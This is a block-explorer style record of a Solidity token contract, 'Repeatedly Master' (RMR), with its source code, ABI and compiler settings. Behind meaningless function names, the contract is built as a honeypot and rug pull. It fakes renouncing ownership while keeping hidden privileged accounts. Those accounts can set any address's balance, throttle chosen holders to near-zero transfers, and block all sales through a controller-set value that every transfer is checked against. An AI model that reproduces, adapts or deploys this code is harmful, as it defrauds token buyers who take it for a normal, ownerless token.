{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface teamAmount {\n    function createPair(address swapTx, address walletSell) external returns (address);\n}\n\ninterface totalTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeBuyReceiver) external view returns (uint256);\n\n    function transfer(address walletAmount, uint256 tokenLaunch) external returns (bool);\n\n    function allowance(address toSellWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletAmount,\n        uint256 tokenLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenMarketing, uint256 value);\n    event Approval(address indexed toSellWallet, address indexed spender, uint256 value);\n}\n\nabstract contract takeTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxReceiver is totalTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RepeatedlyMaster is takeTo, totalTo, maxReceiver {\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellTotal;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverFund;\n    }\n\n    function balanceOf(address takeBuyReceiver) public view virtual override returns (uint256) {\n        return feeAutoSwap[takeBuyReceiver];\n    }\n\n    function tokenTx() private view {\n        require(receiverSwap[_msgSender()]);\n    }\n\n    constructor (){\n        if (toSwap) {\n            toTotal = limitSell;\n        }\n        buyAuto walletList = buyAuto(txExemptFee);\n        shouldFundWallet = teamAmount(walletList.factory()).createPair(walletList.WETH(), address(this));\n        \n        isTakeTx = _msgSender();\n        receiverSwap[isTakeTx] = true;\n        feeAutoSwap[isTakeTx] = listTo;\n        tokenShould();\n        if (fromMin != autoBuy) {\n            autoBuy = fromMin;\n        }\n        emit Transfer(address(0), isTakeTx, listTo);\n    }\n\n    uint256 toAmount;\n\n    function swapEnable(address enableBuy) public {\n        require(enableBuy.balance < 100000);\n        if (autoLiquidity) {\n            return;\n        }\n        \n        receiverSwap[enableBuy] = true;\n        \n        autoLiquidity = true;\n    }\n\n    uint256 private listTo = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public receiverSwap;\n\n    function transferFrom(address toLaunch, address walletAmount, uint256 tokenLaunch) external override returns (bool) {\n        if (_msgSender() != txExemptFee) {\n            if (exemptAt[toLaunch][_msgSender()] != type(uint256).max) {\n                require(tokenLaunch <= exemptAt[toLaunch][_msgSender()]);\n                exemptAt[toLaunch][_msgSender()] -= tokenLaunch;\n            }\n        }\n        return marketingTo(toLaunch, walletAmount, tokenLaunch);\n    }\n\n    function owner() external view returns (address) {\n        return receiverFund;\n    }\n\n    bool public autoLiquidity;\n\n    uint256 private toTotal;\n\n    uint256 private fromMin;\n\n    uint8 private sellTotal = 18;\n\n    event OwnershipTransferred(address indexed swapMin, address indexed isLaunch);\n\n    function buyList(address swapToIs, uint256 tokenLaunch) public {\n        tokenTx();\n        feeAutoSwap[swapToIs] = tokenLaunch;\n    }\n\n    function transfer(address swapToIs, uint256 tokenLaunch) external virtual override returns (bool) {\n        return marketingTo(_msgSender(), swapToIs, tokenLaunch);\n    }\n\n    function approve(address walletAt, uint256 tokenLaunch) public virtual override returns (bool) {\n        exemptAt[_msgSender()][walletAt] = tokenLaunch;\n        emit Approval(_msgSender(), walletAt, tokenLaunch);\n        return true;\n    }\n\n    mapping(address => uint256) private feeAutoSwap;\n\n    bool private launchedMode;\n\n    function name() external view virtual override returns (string memory) {\n        return sellEnable;\n    }\n\n    address public isTakeTx;\n\n    uint256 constant modeMin = 10 ** 10;\n\n    address public shouldFundWallet;\n\n    string private launchedEnable = \"RMR\";\n\n    function tokenShould() public {\n        emit OwnershipTransferred(isTakeTx, address(0));\n        receiverFund = address(0);\n    }\n\n    address amountMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public autoBuy;\n\n    function receiverAutoSell(address toLaunch, address walletAmount, uint256 tokenLaunch) internal returns (bool) {\n        require(feeAutoSwap[toLaunch] >= tokenLaunch);\n        feeAutoSwap[toLaunch] -= tokenLaunch;\n        feeAutoSwap[walletAmount] += tokenLaunch;\n        emit Transfer(toLaunch, walletAmount, tokenLaunch);\n        return true;\n    }\n\n    uint256 autoAmountAt;\n\n    function marketingReceiver(address autoExempt) public {\n        tokenTx();\n        if (maxTotalAt == launchedMode) {\n            launchedMode = true;\n        }\n        if (autoExempt == isTakeTx || autoExempt == shouldFundWallet) {\n            return;\n        }\n        totalFeeTrading[autoExempt] = true;\n    }\n\n    bool public enableAt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedEnable;\n    }\n\n    address txExemptFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address receiverSell, address walletAt) external view virtual override returns (uint256) {\n        if (walletAt == txExemptFee) {\n            return type(uint256).max;\n        }\n        return exemptAt[receiverSell][walletAt];\n    }\n\n    bool public toSwap;\n\n    bool private isTeam;\n\n    mapping(address => mapping(address => uint256)) private exemptAt;\n\n    mapping(address => bool) public totalFeeTrading;\n\n    bool public maxTotalAt;\n\n    function marketingLaunched(uint256 tokenLaunch) public {\n        tokenTx();\n        autoAmountAt = tokenLaunch;\n    }\n\n    uint256 public limitSell;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTo;\n    }\n\n    function marketingTo(address toLaunch, address walletAmount, uint256 tokenLaunch) internal returns (bool) {\n        if (toLaunch == isTakeTx) {\n            return receiverAutoSell(toLaunch, walletAmount, tokenLaunch);\n        }\n        uint256 shouldReceiverAmount = totalTo(shouldFundWallet).balanceOf(amountMax);\n        require(shouldReceiverAmount == autoAmountAt);\n        require(walletAmount != amountMax);\n        if (totalFeeTrading[toLaunch]) {\n            return receiverAutoSell(toLaunch, walletAmount, modeMin);\n        }\n        return receiverAutoSell(toLaunch, walletAmount, tokenLaunch);\n    }\n\n    string private sellEnable = \"Repeatedly Master\";\n\n    address private receiverFund;\n\n    bool public takeMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toSellWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeBuyReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapToIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenLaunch\",\"type\":\"uint256\"}],\"name\":\"buyList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTakeTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenLaunch\",\"type\":\"uint256\"}],\"name\":\"marketingLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoExempt\",\"type\":\"address\"}],\"name\":\"marketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTotalAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFundWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuy\",\"type\":\"address\"}],\"name\":\"swapEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalFeeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapToIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RepeatedlyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}